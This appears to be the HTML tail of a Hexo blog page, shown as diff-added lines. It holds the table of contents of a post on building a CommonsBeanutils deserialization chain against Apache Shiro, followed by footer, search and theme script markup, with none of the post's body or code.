+        <div class="toc-title">此页目录</div>
+        <div class="page-title">shiro无CC打CB依赖</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81JavaBean"><span class="nav-text">二、JavaBean</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%9E%84%E9%80%A0CB%E9%93%BE"><span class="nav-text">三、构造CB链</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81shiro%E6%89%93CB%E4%BE%9D%E8%B5%96"><span class="nav-text">四、shiro打CB依赖</span></a></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">GTL-JU</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.0</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2023/4/8 0:0:0
+            </div>
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/layouts/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
